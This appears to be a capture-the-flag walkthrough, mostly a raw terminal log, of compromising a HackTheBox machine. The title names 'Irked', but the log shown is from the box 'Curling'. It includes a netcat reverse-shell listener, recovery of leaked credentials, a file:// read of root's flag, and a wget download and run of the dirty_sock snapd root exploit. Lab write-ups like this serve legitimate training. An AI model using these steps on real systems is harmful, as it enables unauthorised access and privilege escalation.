---
title: "HackTheBox - Irked"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# nmap -sV -sC 10.10.10.150  
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-31 14:47 CEST  
Nmap scan report for 10.10.10.150  
Host is up (0.026s latency).  
Not shown: 998 closed ports  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)  
| 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)  
|_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
|_http-generator: Joomla! - Open Source Content Management  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Home  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds

root@kali:~# gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.150:80 -t 50

=====================================================  
Gobuster v2.0.1 OJ Reeves (@TheColonial)  
=====================================================  
[+] Mode : dir  
[+] Url/Domain : http://10.10.10.150:80/  
[+] Threads : 50  
[+] Wordlist : /usr/share/wordlists/dirb/common.txt  
[+] Status codes : 200,204,301,302,307,403  
[+] Timeout : 10s  
=====================================================  
2019/03/31 14:48:20 Starting gobuster  
=====================================================  
/.hta (Status: 403)  
/.htaccess (Status: 403)  
/.htpasswd (Status: 403)  
/administrator (Status: 301)  
/bin (Status: 301)  
/cache (Status: 301)  
/components (Status: 301)  
/images (Status: 301)  
/includes (Status: 301)  
/index.php (Status: 200)  
/language (Status: 301)  
/layouts (Status: 301)  
/libraries (Status: 301)  
/media (Status: 301)  
/modules (Status: 301)  
/plugins (Status: 301)  
/server-status (Status: 403)  
/templates (Status: 301)  
/tmp (Status: 301)  
=====================================================  
2019/03/31 14:48:26 Finished  
=====================================================

root@kali:~# echo "Q3VybGluZzIwMTgh" | base64 -d  
Curling2018!root@kali:~# ifconfig tun0  
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500  
inet 10.10.13.2 netmask 255.255.252.0 destination 10.10.13.2  
inet6 dead:beef:2::1100 prefixlen 64 scopeid 0x0<global>  
inet6 fe80::585f:b579:1f65:38e7 prefixlen 64 scopeid 0x20<link>  
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)  
RX packets 28411 bytes 7832677 (7.4 MiB)  
RX errors 0 dropped 0 overruns 0 frame 0  
TX packets 35723 bytes 3524631 (3.3 MiB)  
TX errors 0 dropped 297 overruns 0 carrier 0 collisions 0

root@kali:~# clear  
root@kali:~# nc -lnvp 1234  
listening on [any] 1234 ...  
connect to [10.10.13.2] from (UNKNOWN) [10.10.10.150] 44812  
/bin/sh: 0: can't access tty; job control turned off  
$ python -c 'import pty; pty.spawn("/bin/bash")'  
/bin/sh: 1: python: not found  
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@curling:/var/www/html/templates/protostar$ ^Z  
[1]+ Stopped nc -lnvp 1234  
root@kali:~# stty raw -echo  
root@kali:~# nc -lnvp 1234

<tml/templates/protostar$ export TERM=xterm256-color  
www-data@curling:/var/www/html/templates/protostar$ cd /home  
www-data@curling:/home$ ls  
dirty_sock floris  
www-data@curling:/home$ cd floris  
www-data@curling:/home/floris$ ls -alh  
total 116K  
drwxr-xr-x 6 floris floris 4.0K Mar 31 13:16 .  
drwxr-xr-x 4 root root 4.0K Mar 31 13:12 ..  
lrwxrwxrwx 1 root root 9 May 22 2018 .bash_history -> /dev/null  
-rw-r--r-- 1 floris floris 220 Apr 4 2018 .bash_logout  
-rw-r--r-- 1 floris floris 3.7K Apr 4 2018 .bashrc  
drwx------ 2 floris floris 4.0K May 22 2018 .cache  
drwx------ 3 floris floris 4.0K May 22 2018 .gnupg  
drwxrwxr-x 3 floris floris 4.0K May 22 2018 .local  
-rw-r--r-- 1 floris floris 807 Apr 4 2018 .profile  
-rw------- 1 floris floris 1.2K Mar 31 13:12 .viminfo  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:12 README.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README1.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README10.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README11.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README2.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README3.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README4.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README5.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README6.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README7.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README8.txt  
-rw-rw-r-- 1 floris floris 52 Mar 31 13:16 README9.txt  
drwxr-x--- 2 root floris 4.0K May 22 2018 admin-area  
-rw-rw-r-- 1 floris floris 5.4K Mar 31 13:09 dirty_sockv1.py  
-rwxrwxr-x 1 floris floris 8.5K Mar 31 13:09 dirty_sockv2.py  
-rw-r--r-- 1 floris floris 1.1K May 22 2018 password_backup  
-rw-r----- 1 floris floris 33 May 22 2018 user.txt

www-data@curling:/home/floris$ cat password_backup  
00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&SY...H..  
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4  
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...`  
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@......  
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h..  
00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4  
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J..  
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..<~.x  
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .>...sVT.zH....1  
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s."  
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R.  
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p..  
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C  
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*..  
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P.  
000000f0: 819b bb48 ...H  
www-data@curling:/home/floris$ xxd -r < password_backup > password_backup2  
bash: password_backup2: Permission denied  
www-data@curling:/home/floris$ xxd -r < password_backup | file -  
/dev/stdin: bzip2 compressed data, block size = 900k  
www-data@curling:/home/floris$ xxd -r < password_backup | bzcat | file -  
/dev/stdin: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix  
<is$ xxd -r < password_backup | bzcat | gunzip -c | file -  
/dev/stdin: bzip2 compressed data, block size = 900k  
<d -r < password_backup | bzcat | gunzip -c | bzcat | file -  
/dev/stdin: POSIX tar archive (GNU)  
<assword_backup | bzcat | gunzip -c | bzcat | tar x0 | file -  
tar: Options '-[0-7][lmh]' not supported by *this* tar  
Try 'tar --help' or 'tar --usage' for more information.  
/dev/stdin: empty  
<ackup | bzcat | gunzip -c | bzcat | tar xO | file -  
/dev/stdin: ASCII text  
<ackup | bzcat | gunzip -c | bzcat | tar xO  
5d<wdCbdZu)|hChXll

root@kali:~# ssh floris@10.10.10.150 [456/456]  
floris@10.10.10.150's password:  
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)

* Documentation: https://help.ubuntu.com  
* Management: https://landscape.canonical.com  
* Support: https://ubuntu.com/advantage

System information as of Sun Mar 31 13:24:19 UTC 2019

System load: 0.0 Processes: 203  
Usage of /: 46.3% of 9.78GB Users logged in: 1  
Memory usage: 24% IP address for ens33: 10.10.10.150  
Swap usage: 0%

0 packages can be updated.  
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Mar 31 13:11:06 2019 from 10.10.15.247  
floris@curling:~$ cat user.txt  
65d#########ZENSIERT#########30b

floris@curling:~/admin-area$ ls -alh  
total 28K  
drwxr-x--- 2 root floris 4.0K May 22 2018 .  
drwxr-xr-x 6 floris floris 4.0K Mar 31 13:16 ..  
-rw-rw---- 1 root floris 25 Mar 31 13:29 input  
-rw-rw---- 1 root floris 14K Mar 31 13:29 report  
floris@curling:~/admin-area$ cat input  
url = "http://127.0.0.1"  
floris@curling:~/admin-area$ cat report  
<!DOCTYPE html>  
<html lang="en-gb" dir="ltr">  
[...]

floris@curling:~/admin-area$ vim input

url = "file:///root/root.txt"

floris@curling:~/admin-area$ ls -alh  
total 16K  
drwxr-x--- 2 root floris 4.0K May 22 2018 .  
drwxr-xr-x 6 floris floris 4.0K Mar 31 13:30 ..  
-rw-rw---- 1 root floris 25 Mar 31 13:31 input  
-rw-rw---- 1 root floris 33 Mar 31 13:31 report  
floris@curling:~/admin-area$ cat report  
82c198ab6fc5365fdc6da2ee5c26064a

floris@curling:~$ cd /tmp  
floris@curling:/tmp$ wget http://10.10.14.105:8000/dirty_sockv2.py  
--2019-04-01 08:34:22-- http://10.10.14.105:8000/dirty_sockv2.py  
Connecting to 10.10.14.105:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 8696 (8.5K) [text/plain]  
Saving to: 'dirty_sockv2.py'

dirty_sockv2.py 100%[=====================================================================================================================>] 8.49K --.-KB/s in 0s

2019-04-01 08:34:22 (46.3 MB/s) - 'dirty_sockv2.py' saved [8696/8696]

floris@curling:/tmp$ python3 dirty_sockv2.py

___ _ ____ ___ _ _ ____ ____ ____ _ _  
| \ | |__/ | \_/ [__ | | | |_/  
|__/ | | \ | | ___ ___] |__| |___ | \_  
(version 2)

//=========[]==========================================\\  
|| R&D || initstring (@init_string) ||  
|| Source || https://github.com/initstring/dirty_sock ||  
|| Details || https://initblog.com/2019/dirty-sock ||  
\\=========[]==========================================//

[+] Slipped dirty sock on random socket file: /tmp/wvjupqdeyv;uid=0;  
[+] Binding to socket file...  
[+] Connecting to snapd API...  
[+] Deleting trojan snap (and sleeping 5 seconds)...  
[+] Installing the trojan snap (and sleeping 8 seconds)...  
[+] Deleting trojan snap (and sleeping 5 seconds)...

********************  
Success! You can now `su` to the following account and use sudo:  
username: dirty_sock  
password: dirty_sock  
********************

floris@curling:/tmp$ su dirty_sock  
Password:  
To run a command as administrator (user "root"), use "sudo <command>".  
See "man sudo_root" for details.

dirty_sock@curling:/tmp$ sudo su  
[sudo] password for dirty_sock:  
root@curling:/tmp# cat /root/root.txt  
82c#########ZENSIERT#########64a  
root@curling:/tmp#